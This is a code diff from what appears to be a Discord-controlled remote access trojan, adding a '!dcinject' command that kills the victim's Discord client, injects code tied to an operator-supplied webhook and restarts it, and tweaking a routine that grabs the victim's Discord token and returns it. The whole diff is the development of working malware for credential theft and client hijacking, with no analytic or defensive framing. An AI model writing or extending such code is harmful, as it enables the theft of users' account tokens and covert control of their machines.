@@ -270,6 +270,19 @@ def get_response(user_input: str) -> str:
             webbrowser.open(website)
             return "```website is open!```"
         
+    elif "!dcinject" in text.lower():
+        string = user_input
+        say = "!dcinject "
+        if say in string:
+            saysplit = string.split(say,1)
+            webhook = saysplit[1]
+
+            kill_discord()
+            inject_into_discord(webhook)
+            start_discord()
+
+            return "```Injected!```"
+        
     elif "!kill" in text.lower():
         string = text
         say = "!kill "
@@ -335,7 +348,6 @@ def get_response(user_input: str) -> str:
         kill_discord()
 
         dcInfo = get_token()
-        start_discord()
         return dcInfo
     
         
@@ -738,19 +750,8 @@ async def on_message(message: Message) -> None:
             pass
 
 
-    if "!dcinject" in user_message.lower():
-        string = user_message
-        say = "!dcinject "
-        if say in string:
-            saysplit = string.split(say,1)
-            webhook = saysplit[1]
+    
 
-            kill_discord()
-            inject_into_discord(webhook)
-            start_discord()
-
-            message = "Injected!"
-            await send_message(message, user_message)
 
 
 
